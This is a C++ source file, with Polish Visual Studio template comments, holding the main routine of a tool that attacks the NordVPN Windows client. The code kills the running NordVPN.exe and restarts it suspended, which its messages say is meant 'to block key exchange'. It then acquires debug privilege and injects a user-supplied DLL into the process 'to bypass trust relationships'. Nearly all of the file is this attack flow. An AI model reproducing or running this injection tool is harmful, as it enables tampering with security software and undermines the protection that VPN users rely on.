// Nord.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <cstdio>
#include <stdexcept>
#include <filesystem>
#include <conio.h>

#include "Nord.h"
#include "Helpers.h"
#include "Inject.h"

int main(int argc, char** argv)
{
    try {
        Options Cmd_argv = parse(argc, argv);

        Nord Nord_app;
        if (!Nord_app.is_installed()) {
            printf("[!]. NordVPN app not found on this system.\r\n");
            return -1;
        }
        printf("[+]. NordVPN version %s\r\n", Nord_app.version().c_str());

        DWORD pid = Nord_app.is_running();
        if (pid != -1) {
            
            printf("[+]. NordVPN.exe is running\r\n");
            if (Nord_app.stop(pid)) {
                printf("[+]. NordVPN process terminated\r\n");
            }
            else {
                printf("[!]. Failed to stop the process.\r\n");
                return -1;
            }

        }

        if (Nord_app.start_suspended() == -1) {
            printf("[!]. Process creation failed\r\n");
            return -1;
        }

        printf("[+]. Creating a process in SUSPENDED mode to block key exchange\r\n");
        printf("[+]. Injecting code to bypass trust relationships\r\n");

        Inject Inj(Cmd_argv.dll);
        Inj.se_debug();
        if (!Inj.inject(Nord_app.get_pid())) {
            printf("[!]. Code injection failed\r\n");
            return -1;
        }

        printf("[+]. Code injected\r\n");
        printf("[+]. Press any key to terminate\r\n");

        _getch();

    }
    catch (const std::runtime_error& error) {
        printf("[x]. An exception occurred %s\r\n", error.what());
    }
    catch (...) {
        printf("[x]. Fatal exception occurred\r\n");
    }
    return 0;
}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
